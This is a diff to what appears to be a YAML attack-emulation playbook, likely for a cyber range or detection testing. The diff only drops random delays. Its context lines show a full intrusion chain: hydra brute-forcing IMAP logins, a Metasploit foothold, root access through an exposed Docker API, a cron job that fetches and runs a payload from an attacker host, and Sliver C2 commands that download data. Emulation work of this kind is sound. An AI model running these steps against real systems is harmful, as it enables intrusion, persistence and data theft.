@@ -31,7 +31,7 @@ commands:
 
   - type: sleep
     seconds: 30
-    random: true
+
 
   - type: shell
     cmd: hydra -l "alice@$DOMAIN" -P smtp-pass.txt -c 5 -s 143 $MAIL_HOST imap  
@@ -43,7 +43,6 @@ commands:
 
   - type: sleep
     seconds: 30
-    random: true
 
   - type: http-client
     url: http://$SERVER_ADDRESS:8080
@@ -108,7 +107,6 @@ commands:
 
   - type: sleep
     seconds: 30
-    random: true
 
   - type: msf-session
     session: "foothold"
@@ -126,8 +124,6 @@ commands:
 
   - type: sleep
     seconds: 30
-    random: true
-
 
   - type: shell
     cmd: docker -H tcp://localhost:1090 network list
@@ -138,7 +134,6 @@ commands:
 
   - type: sleep
     seconds: 30
-    random: true
 
   - type: shell
     cmd: docker -H tcp://localhost:1090 run --rm -t -u root --network=nextcloud_default -v /etc:/root/etc  kalilinux/kali-rolling bash -c "echo \"*/5 * * * * root test -e /opt/tool || curl http://$ATTACKER_ADDRESS:8888/tool > /opt/tool && chmod +x /opt/tool && /opt/tool\" > /root/etc/cron.d/sysvz"
@@ -149,7 +144,6 @@ commands:
 
   - type: sleep
     seconds: 360
-    random: true
 
   - type: sliver-session
     cmd: ls
@@ -163,7 +157,6 @@ commands:
 
   - type: sleep
     seconds: 30
-    random: true
 
   - type: sliver-session
     cmd: ps
@@ -179,7 +172,6 @@ commands:
 
   - type: sleep
     seconds: 30
-    random: true
 
   - type: sliver-session
     cmd: download
